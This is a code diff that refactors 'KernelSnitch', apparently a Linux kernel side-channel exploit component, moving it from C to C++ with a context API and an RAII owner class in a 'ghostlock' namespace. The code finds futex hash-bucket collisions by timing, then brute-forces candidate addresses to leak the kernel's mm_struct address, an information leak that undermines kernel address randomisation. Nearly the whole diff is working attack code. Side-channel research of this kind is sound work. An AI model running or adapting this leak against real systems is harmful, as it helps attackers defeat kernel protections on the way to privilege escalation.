@@ -3,6 +3,7 @@
 #include "timeutils.h"
 #include "utils.h"
 #include "futex_hash.h"
+#include "scan_bounds.h"
 
 #include <linux/futex.h>
 #include <sys/syscall.h>
@@ -17,6 +18,10 @@
 #if !defined(__ARM) && !defined(__INTEL) && !defined(__AMD)
 #define __INTEL
 #endif
+
+/* Measured direct-map end (never wider than the built-in bound). Owned by the
+ * address-space layer; KernelSnitch only reads it to bound its scan. */
+extern uint64_t g_direct_map_end;
 
 #define FUTEX_SZ (64ULL<<30)
 #define FUTEX_MMAP_SZ (1ULL<<30)
@@ -59,12 +64,16 @@ enum kernelsnitch_state {
     KERNELSNITCH_MM_NOT_FOUND,
     KERNELSNITCH_LAST,
 };
-char *kernelsnitch_strings[KERNELSNITCH_LAST] = {
-    "not initialized",
-    "initialized",
-    "collisions found",
-    "mm_struct found",
-    "mm_struct not found",
+/* One label per state. The table previously skipped
+ * KERNELSNITCH_COLLISIONS_NOT_FOUND, so every later state printed the wrong
+ * label and KERNELSNITCH_MM_NOT_FOUND read past the array. */
+static const char *const kernelsnitch_strings[KERNELSNITCH_LAST] = {
+    "not initialized",      /* KERNELSNITCH_NOT_INIT */
+    "initialized",          /* KERNELSNITCH_INIT */
+    "collisions found",     /* KERNELSNITCH_COLLISIONS_FOUND */
+    "collisions not found", /* KERNELSNITCH_COLLISIONS_NOT_FOUND */
+    "mm_struct found",      /* KERNELSNITCH_MM_FOUND */
+    "mm_struct not found",  /* KERNELSNITCH_MM_NOT_FOUND */
 };
 
 struct kernelsnitch_shared_state {
@@ -77,6 +86,7 @@ struct kernelsnitch_shared_state {
     size_t cpu_cnt;
     size_t futex_hash_table_size;
     size_t total_futexes;
+    FutexHashContext futex_hash;
 
     volatile unsigned char *futexes;
     volatile unsigned char inc_futex[PAGE_SIZE];
@@ -93,6 +103,11 @@ struct kernelsnitch_shared_state {
     enum kernelsnitch_state state;
 };
 
+/* KernelSnitchContext remains mmap-backed because collision discovery may run
+ * in a helper process. The typedef gives callers an owned lifecycle type while
+ * preserving the shared layout and worker argument ABI during migration. */
+typedef struct kernelsnitch_shared_state KernelSnitchContext;
+
 #define WAIT() do { for (size_t i = 0; i < 2; ++i) sched_yield(); } while (0)
 
 /**
@@ -100,7 +115,7 @@ struct kernelsnitch_shared_state {
  */
 static int __futex(unsigned int *uaddr, int futex_op, unsigned int val, const struct timespec *timeout, unsigned int *uaddr2, unsigned int val3)
 {
-    return syscall(SYS_futex, uaddr, futex_op, val, timeout, uaddr2, val3);
+    return (int) syscall(SYS_futex, uaddr, futex_op, val, timeout, uaddr2, val3);
 }
 
 /**
@@ -117,7 +132,7 @@ static void *__do_increase(void *arg)
     struct inc_arg *inc_arg = (struct inc_arg *)arg;
     struct kernelsnitch_shared_state *ks = inc_arg->ks;
     size_t id = inc_arg->id;
-    SYSCHK(__futex((unsigned int *)&ks->inc_futex[id], FUTEX_WAIT_PRIVATE, 0, NULL, NULL, 0));
+    SYSCHK(__futex((unsigned int *)&ks->inc_futex[id], FUTEX_WAIT_PRIVATE, 0, nullptr, nullptr, 0));
     free(inc_arg);
     return 0;
 }
@@ -128,12 +143,19 @@ static void *__do_increase(void *arg)
  * @arg id: identifier of the futex user-space address to be used for the increase
  * @arg amount: increase
  */
+/* Decoupling plan: coordinate one collision-amplification worker. Inputs:
+ * KernelSnitchContext, worker id and amount; output: synchronized completion.
+ * Future: kernelsnitch_worker_increase(context, id, amount). */
+/* TODO(CPP06-KS-RAII): a partial worker-start failure is only logged here; the
+ * failure-injection coverage remains a maintenance item. Completion: cover the
+ * failure path, then delete this comment and the residual row. */
 static void __increase(struct kernelsnitch_shared_state *ks, size_t id, size_t amount)
 {
     pthread_t tid;
     for (size_t i = 0; i < amount; ++i) {
-        struct inc_arg *inc_arg = calloc(1, sizeof(struct inc_arg));
-        inc_arg->id = id;
+        auto *inc_arg = static_cast<struct inc_arg *>(
+            calloc(1, sizeof(struct inc_arg)));
+        inc_arg->id = id;  // NOLINT(clang-analyzer-nullability.NullableDereferenced)
         inc_arg->ks = ks;
         int err = pthread_create(&tid, 0, __do_increase, (void *)inc_arg);
         if (err)
@@ -155,7 +177,7 @@ static void __increase(struct kernelsnitch_shared_state *ks, size_t id, size_t a
 
 static int __compare(const void *a, const void *b)
 {
-    return (*(size_t *)a - *(size_t *)b);
+    return (int) (*(size_t *)a - *(size_t *)b);
 }
 
 /**
@@ -175,7 +197,7 @@ static size_t __measure(size_t futex_addr, size_t repeat, size_t avg)
     for (size_t l = 0; l < repeat; ++l) {
         sched_yield();
         t0 = rdtsc_begin();
-        SYSCHK(__futex((unsigned int *)futex_addr, FUTEX_WAKE_PRIVATE, 0, NULL, NULL, 0));
+        SYSCHK(__futex((unsigned int *)futex_addr, FUTEX_WAKE_PRIVATE, 0, nullptr, nullptr, 0));
         t1 = rdtsc_end();
         __times[l] = t1 - t0;
     }
@@ -206,7 +228,8 @@ struct mm_leak_arg {
 static int __mm_candidate_matches(struct kernelsnitch_shared_state *ks, size_t candidate)
 {
     for (size_t i = 1; i < ks->collisions; ++i) {
-        if (futex_hash(ks->futex_addrs[0], candidate) != futex_hash(ks->futex_addrs[i], candidate))
+        if (futex_hash_context_bucket(&ks->futex_hash, ks->futex_addrs[0], candidate) !=
+            futex_hash_context_bucket(&ks->futex_hash, ks->futex_addrs[i], candidate))
             return 0;
     }
     return 1;
@@ -230,13 +253,9 @@ static void *__mm_leak(void *arg)
     for (size_t coarse_addr = range->start; (coarse_addr < range->end) && !ks->found; coarse_addr += COARSE_SZ) {
         if ((coarse_addr % (1ULL << 40)) == 0)
             if (ks->verbose) pr_info("[% 3zd] [%016zx-%016llx]\n", range->id, coarse_addr, coarse_addr + (1ULL << 40));
-        size_t slab_end = coarse_addr + COARSE_SZ;
-        if (slab_end > range->end)
-            slab_end = range->end;
+        size_t slab_end = kernelsnitch_scan_limit(coarse_addr, COARSE_SZ, range->end);
         for (size_t slab_addr = coarse_addr; (slab_addr < slab_end) && !ks->found; slab_addr += mm_slab_sz) {
-            size_t slab_limit = slab_addr + mm_slab_sz;
-            if (slab_limit > slab_end)
-                slab_limit = slab_end;
+            size_t slab_limit = kernelsnitch_scan_limit(slab_addr, mm_slab_sz, slab_end);
             for (size_t mm_struct_candidate = slab_addr; (mm_struct_candidate < slab_limit) && !ks->found; mm_struct_candidate += ks->mm_struct_sz) {
 
                 if (mm_leak_arg->try_canonical) {
@@ -265,14 +284,16 @@ static void *__mm_leak(void *arg)
     return 0;
 }
 
+/* Decoupling plan: run one mm-address leak pass. Inputs: snitch context and
+ * scan policy; output: candidate state. Future: kernelsnitch_scan_mm_pass(). */
 static void __run_mm_leak_pass(struct kernelsnitch_shared_state *ks, int try_canonical, int sweep_tags)
 {
     /* the leak check discards a match past the measured end, so no slice
      * scans past it */
-    size_t ceiling = MIN(g_direct_map_end, IDENTITY_END);
+    const size_t ceiling = MIN(g_direct_map_end, IDENTITY_END);
     for (size_t i = 0; i < ks->thread_cnt; ++i) {
         struct mm_leak_arg *mm_leak_arg = (struct mm_leak_arg *)SYSCHK(calloc(1, sizeof(struct mm_leak_arg)));
-        mm_leak_arg->ks = ks;
+        mm_leak_arg->ks = ks;  // NOLINT(clang-analyzer-nullability.NullableDereferenced)
         mm_leak_arg->range.id = i;
         mm_leak_arg->range.start = IDENTITY_START + ks->identity_diff*i;
         mm_leak_arg->range.end = IDENTITY_START + ks->identity_diff*(i+1);
@@ -301,31 +322,43 @@ static void __run_mm_leak_pass(struct kernelsnitch_shared_state *ks, int try_can
  * @arg __thread_cnt: thread count used for the bruteforcing phase
  * @arg __collision_cnt: collision count to then try to correlate the mm_struct address to the user addresses
  * @arg __verbose: amount of print info, 1 enables and 0 disables
+ * @arg __pin_cpu: CPU the calling thread is pinned to for the search
  * @return shared KernelSnitch state
  */
-struct kernelsnitch_shared_state *kernelsnitch_setup(size_t __mm_struct_sz, size_t __mm_slab_order, size_t __thread_cnt, size_t __collision_cnt, size_t __verbose)
+KernelSnitchContext *kernelsnitch_context_init(size_t __mm_struct_sz,
+                                               size_t __mm_slab_order,
+                                               size_t __thread_cnt,
+                                               size_t __collision_cnt,
+                                               size_t __verbose,
+                                               size_t __pin_cpu)
 {
-    struct kernelsnitch_shared_state *ks = SYSCHK(mmap(0, sizeof(struct kernelsnitch_shared_state), PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0));
-    ks->mm_struct = -1;
+    auto *ks = static_cast<KernelSnitchContext *>(SYSCHK(mmap(
+        0, sizeof(KernelSnitchContext), PROT_WRITE|PROT_READ,
+        MAP_ANON|MAP_SHARED, -1, 0)));
+    ks->mm_struct = (size_t) -1;
     ks->scan_done = 0;
     ks->mm_struct_sz = __mm_struct_sz;
     ks->mm_slab_order = __mm_slab_order;
-    ks->cpu_cnt = sysconf(_SC_NPROCESSORS_ONLN)*2;
+    size_t online_cpu_cnt = (size_t)SYSCHK(sysconf(_SC_NPROCESSORS_ONLN));
+    ks->cpu_cnt = online_cpu_cnt*2;
     ks->thread_cnt = __thread_cnt;
     ks->collisions = __collision_cnt;
     ks->verbose = __verbose;
 
     // unfortunately I have to use a the kernelsnitch_shared_state and mmap(shared) as find collisions and bruteforce might be in different processes!!!
     ks->futex_hash_table_size = 256*ks->cpu_cnt;
+    SYSCHK(futex_hash_context_init(&ks->futex_hash, 256*online_cpu_cnt));
     ks->total_futexes = ks->futex_hash_table_size*ks->collisions*MULITPLE;
     ks->times = (volatile size_t *)SYSCHK(mmap(0, sizeof(size_t)*ks->total_futexes, PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0));
     ks->tids = (pthread_t *)SYSCHK(mmap(0, sizeof(pthread_t)*ks->thread_cnt, PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0));
-    ks->futexes = SYSCHK(mmap(0, FUTEX_SZ, PROT_NONE, MAP_ANON|MAP_PRIVATE|MAP_NORESERVE, -1, 0));
+    ks->futexes = static_cast<volatile unsigned char *>(SYSCHK(mmap(
+        0, FUTEX_SZ, PROT_NONE, MAP_ANON|MAP_PRIVATE|MAP_NORESERVE, -1, 0)));
     for (size_t addr = 0; addr < FUTEX_SZ; addr += FUTEX_MMAP_SZ)
         SYSCHK(mmap((void *)((size_t)ks->futexes + addr), FUTEX_MMAP_SZ, PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED|MAP_FIXED, -1, 0));
     /* mm_structs live in the direct map, so the scan stops at its end and never
      * past the identity range the futexes are drawn from */
-    ks->identity_diff = ((MIN(g_direct_map_end, IDENTITY_END) - IDENTITY_START)/ks->thread_cnt);
+    ks->identity_diff =
+            ((MIN(g_direct_map_end, IDENTITY_END) - IDENTITY_START)/ks->thread_cnt);
 
     ks->futex_addrs = (volatile size_t *)SYSCHK(mmap(0, sizeof(size_t)*(ks->collisions + 1), PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0));
 
@@ -335,8 +368,7 @@ struct kernelsnitch_shared_state *kernelsnitch_setup(size_t __mm_struct_sz, size
         ks->mm_slab_order,
         ks->thread_cnt,
         ks->collisions);
-    pin_to_core(CORE);
-    futex_init();
+    pin_to_core(__pin_cpu);
 
     ks->state = KERNELSNITCH_INIT;
     return ks;
@@ -394,7 +426,7 @@ static size_t __prove_collision_pool(struct kernelsnitch_shared_state *ks, coll_
     size_t wanted = ks->collisions - 1;
     /* pass 1 drains the pile.
        Piled-bucket colliders collapse while ambient buckets stay slow. */
-    __futex((unsigned int *)&ks->inc_futex[id], FUTEX_WAKE_PRIVATE, APPENDED_FUTEXES, NULL, NULL, 0);
+    __futex((unsigned int *)&ks->inc_futex[id], FUTEX_WAKE_PRIVATE, APPENDED_FUTEXES, nullptr, nullptr, 0);
     usleep(200000);
     size_t alive[KERNELSNITCH_COLLISION_POOL];
     size_t alive_t[KERNELSNITCH_COLLISION_POOL];
@@ -426,7 +458,7 @@ static size_t __prove_collision_pool(struct kernelsnitch_shared_state *ks, coll_
     }
     if (count < wanted && drain_on_short) {
         /* leave the bucket drained so a conservative retry starts clean */
-        __futex((unsigned int *)&ks->inc_futex[id], FUTEX_WAKE_PRIVATE, APPENDED_FUTEXES, NULL, NULL, 0);
+        __futex((unsigned int *)&ks->inc_futex[id], FUTEX_WAKE_PRIVATE, APPENDED_FUTEXES, nullptr, nullptr, 0);
         usleep(200000);
     }
     return count;
@@ -456,7 +488,8 @@ static size_t __collision_pass(struct kernelsnitch_shared_state *ks, size_t scan
     ks->futex_addrs[0] = (size_t)&ks->inc_futex[ID];
     if (ks->verbose) pr_info("target    %016zx\n", ks->futex_addrs[0]);
     /* pool of slow candidates, verified below */
-    coll_cand_t *best = calloc(KERNELSNITCH_COLLISION_POOL, sizeof(coll_cand_t));
+    auto *best = static_cast<coll_cand_t *>(
+        calloc(KERNELSNITCH_COLLISION_POOL, sizeof(coll_cand_t)));
     ASSERT_pr(best, "calloc best\n");
     size_t cheap_probe_extra = MAX((wanted + 2) / 3, (size_t)KERNELSNITCH_EARLY_CHEAP_MIN_EXTRA);
     size_t cheap_probe_after = ks->futex_hash_table_size * (wanted + cheap_probe_extra);
@@ -524,7 +557,9 @@ static size_t __collision_pass(struct kernelsnitch_shared_state *ks, size_t scan
  * Find collisions for different user space futex addresses within one process and the piled-up hash bucket
  * @arg ks: shared KernelSnitch state
  */
-void kernelsnitch_find_collisions(struct kernelsnitch_shared_state *ks)
+/* Execute collision discovery. Input/output: KernelSnitchContext; output:
+ * collision set and state transition retained by the context. */
+void kernelsnitch_context_find_collisions(KernelSnitchContext *ks)
 {
     ASSERT_pr((ks->state == KERNELSNITCH_INIT), "wrong state\n");
     ASSERT_pr((ks->collisions >= 2), "need at least one collision\n");
@@ -544,7 +579,8 @@ void kernelsnitch_find_collisions(struct kernelsnitch_shared_state *ks)
         ks->state = KERNELSNITCH_COLLISIONS_NOT_FOUND;
     }
 }
-size_t kernelsnitch_found_collisions(struct kernelsnitch_shared_state *ks)
+
+int kernelsnitch_context_has_collisions(const KernelSnitchContext *ks)
 {
     ASSERT_pr((ks->state == KERNELSNITCH_COLLISIONS_FOUND || ks->state == KERNELSNITCH_COLLISIONS_NOT_FOUND), "wrong state\n");
     return ks->state == KERNELSNITCH_COLLISIONS_FOUND;
@@ -554,7 +590,9 @@ size_t kernelsnitch_found_collisions(struct kernelsnitch_shared_state *ks)
  * Brute-forcing phase, where it tests all mm_struct candidates and matches the hash collisions for this current candidate with the observed user space futex addresses
  * @arg ks: shared KernelSnitch state
  */
-void kernelsnitch_bruteforce(struct kernelsnitch_shared_state *ks)
+/* Execute address scanning using discovered collisions. Input/output:
+ * KernelSnitchContext; output: 0 on a selected address, -1 otherwise. */
+int kernelsnitch_context_scan(KernelSnitchContext *ks)
 {
     ASSERT_pr((ks->state == KERNELSNITCH_COLLISIONS_FOUND), "wrong state\n");
     if (ks->verbose) pr_info("start bruteforcing\n");
@@ -564,6 +602,7 @@ void kernelsnitch_bruteforce(struct kernelsnitch_shared_state *ks)
     if (!ks->found)
         __run_mm_leak_pass(ks, 0, 1);
     ks->state = (ks->mm_struct == (size_t)-1) ? KERNELSNITCH_MM_NOT_FOUND : KERNELSNITCH_MM_FOUND;
+    return ks->state == KERNELSNITCH_MM_FOUND ? 0 : -1;
 }
 
 /**
@@ -571,9 +610,16 @@ void kernelsnitch_bruteforce(struct kernelsnitch_shared_state *ks)
  * @arg ks: shared KernelSnitch state
  * @return the found mm_struct or -1 for not found
  */
-size_t kernelsnitch_cleanup(struct kernelsnitch_shared_state *ks)
+/* Read and release are deliberately separate: result borrows the immutable
+ * context, while destroy consumes all mmap-backed context storage. */
+size_t kernelsnitch_context_result(const KernelSnitchContext *ks)
 {
-    ASSERT_pr((ks->state == KERNELSNITCH_MM_FOUND || ks->state == KERNELSNITCH_MM_NOT_FOUND), "wrong state\n");
+    return ks ? ks->mm_struct : (size_t)-1;
+}
+
+void kernelsnitch_context_destroy(KernelSnitchContext *ks)
+{
+    if (!ks) return;
     munmap((void *)ks->times, sizeof(size_t)*ks->total_futexes);
     ks->times = 0;
     munmap((void *)ks->tids, sizeof(pthread_t)*ks->thread_cnt);
@@ -582,30 +628,8 @@ size_t kernelsnitch_cleanup(struct kernelsnitch_shared_state *ks)
     ks->futex_addrs = 0;
     munmap((void *)ks->futexes, FUTEX_SZ);
     ks->futexes = 0;
-    size_t ret = ks->mm_struct;
     if (ks->verbose) pr_info("done\n");
-    munmap(ks, sizeof(struct kernelsnitch_shared_state));
-    return ret;
-}
-
-/**
- * Performs KernelSnitch
- * @arg __mm_struct_sz: sizeof(mm_struct) needed for the bruteforcing phase
- * @arg __mm_slab_order: the order of the mm_struct slab
- * @arg __thread_cnt: thread count used for the bruteforcing phase
- * @arg __collision_cnt: collision count to then try to correlate the mm_struct address to the user addresses
- * @arg __verbose: amount of print info, 1 enables and 0 disables
- * @return the found mm_struct or -1 for not found
- */
-size_t kernelsnitch_param(size_t __mm_struct_sz, size_t __mm_slab_order, size_t __thread_cnt, size_t __collision_cnt, size_t __verbose)
-{
-    struct kernelsnitch_shared_state *ks = kernelsnitch_setup(__mm_struct_sz, __mm_slab_order, __thread_cnt, __collision_cnt, __verbose);
-    if (ks->verbose) pr_info("===============================================\n");
-    kernelsnitch_find_collisions(ks);
-    if (ks->verbose) pr_info("===============================================\n");
-    kernelsnitch_bruteforce(ks);
-    if (ks->verbose) pr_info("===============================================\n");
-    return kernelsnitch_cleanup(ks);
+    munmap(ks, sizeof(KernelSnitchContext));
 }
 
 /**
@@ -630,12 +654,76 @@ void kernelsnitch_print_collisions(struct kernelsnitch_shared_state *ks)
     }
 }
 
-/**
- * KernelSnitch
- * @arg __mm_struct_sz: sizeof(mm_struct) needed for the bruteforcing phase
- * @return: the found mm_struct address
- */
-size_t kernelsnitch(size_t __mm_struct_sz, size_t __mm_slab_order)
-{
-    return kernelsnitch_param(__mm_struct_sz, __mm_slab_order, sysconf(_SC_NPROCESSORS_ONLN)*2, 16, 0);
-}
+/* The KernelSnitchOwner block below is C++-only; the C façade is gone. */
+
+#include <utility>
+
+namespace ghostlock {
+
+/* Owning RAII handle for one KernelSnitchContext. The mmap-backed shared
+ * layout and the C entry points above stay unchanged; this type only makes the
+ * single owner and the explicit init -> find -> scan -> result -> destroy order
+ * visible at the call site. destroy releases user-space mappings only, so the
+ * destructor is safe on every exit path, including a missed search. A forked
+ * leak child borrows the raw context through get() and must never reset it. */
+class KernelSnitchOwner final {
+ public:
+  KernelSnitchOwner() noexcept = default;
+  ~KernelSnitchOwner() noexcept { reset(); }
+
+  KernelSnitchOwner(const KernelSnitchOwner &) = delete;
+  KernelSnitchOwner &operator=(const KernelSnitchOwner &) = delete;
+
+  KernelSnitchOwner(KernelSnitchOwner &&other) noexcept
+      : context_(std::exchange(other.context_, nullptr)) {}
+
+  KernelSnitchOwner &operator=(KernelSnitchOwner &&other) noexcept {
+    if (this != &other) {
+      reset();
+      context_ = std::exchange(other.context_, nullptr);
+    }
+    return *this;
+  }
+
+  [[nodiscard]] static KernelSnitchOwner create(size_t mm_struct_sz,
+                                                size_t mm_slab_order,
+                                                size_t thread_cnt,
+                                                size_t collision_cnt,
+                                                size_t verbose,
+                                                size_t pin_cpu) noexcept {
+    return KernelSnitchOwner(kernelsnitch_context_init(
+        mm_struct_sz, mm_slab_order, thread_cnt, collision_cnt, verbose,
+        pin_cpu));
+  }
+
+  [[nodiscard]] KernelSnitchContext *get() const noexcept { return context_; }
+  [[nodiscard]] bool valid() const noexcept { return context_ != nullptr; }
+
+  void find_collisions() const {
+    kernelsnitch_context_find_collisions(context_);
+  }
+  [[nodiscard]] bool has_collisions() const {
+    return kernelsnitch_context_has_collisions(context_) != 0;
+  }
+  [[nodiscard]] int scan() const {
+    return kernelsnitch_context_scan(context_);
+  }
+  [[nodiscard]] size_t result() const {
+    return kernelsnitch_context_result(context_);
+  }
+
+  void reset() noexcept {
+    if (context_) {
+      kernelsnitch_context_destroy(context_);
+      context_ = nullptr;
+    }
+  }
+
+ private:
+  explicit KernelSnitchOwner(KernelSnitchContext *context) noexcept
+      : context_(context) {}
+
+  KernelSnitchContext *context_ = nullptr;
+};
+
+}  // namespace ghostlock
